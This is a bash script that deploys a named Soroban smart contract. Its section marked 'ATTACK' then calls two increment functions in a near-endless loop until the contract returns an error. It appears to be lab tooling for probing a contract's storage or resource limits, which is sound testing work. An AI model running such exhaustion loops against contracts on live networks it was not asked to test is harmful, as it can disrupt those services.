RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

## SETUP
NETWORK="$1"
CONTRACT="$2"
bash /workspace/src/setup.sh $1

echo "We will attack the $2 contract"
transformed_name_for_wasm=$(echo "$2" | tr '-' '_')

# COMPILE
echo "Compile pair contract"
cd /workspace/$2/
make build

#DEPLOY

ARGS="--network $NETWORK --source admin"
CONTRACT_WASM="/workspace/$2/target/wasm32-unknown-unknown/release/$transformed_name_for_wasm.wasm"

CONTRACT_ID="$(
  soroban contract deploy $ARGS \
    --wasm $CONTRACT_WASM
)"
echo -e "${GREEN} The contract was deployed with ADDRESS: $CONTRACT_ID . ${NC}"
echo " "
echo " "
echo -e "${RED} ====== ${NC}"

# ATTACK

for ((j=i+1; j<999999999; j++)); do

        echo -e "${GREEN} Pushing the vector $j ${NC} to VECTOR A"
        RESPONSE=$(soroban contract invoke \
        $ARGS \
        --id $CONTRACT_ID \
        -- \
        increment_a 2>&1) ## To capture the message

        if [ -n "$RESPONSE" ]; then
            echo "Contract invocation failed with the following message: $RESPONSE"
            break
        else
        echo "Contract invocation successful. No error message received."
        fi

        echo -e "${GREEN} Pushing the vector $j ${NC} to VECTOR B"
        RESPONSE=$(soroban contract invoke \
        $ARGS \
        --id $CONTRACT_ID \
        -- \
        increment_b 2>&1) ## To capture the message

        if [ -n "$RESPONSE" ]; then
            echo "Contract invocation failed with the following message: $RESPONSE"
            break
        else
        echo "Contract invocation successful. No error message received."
        fi
done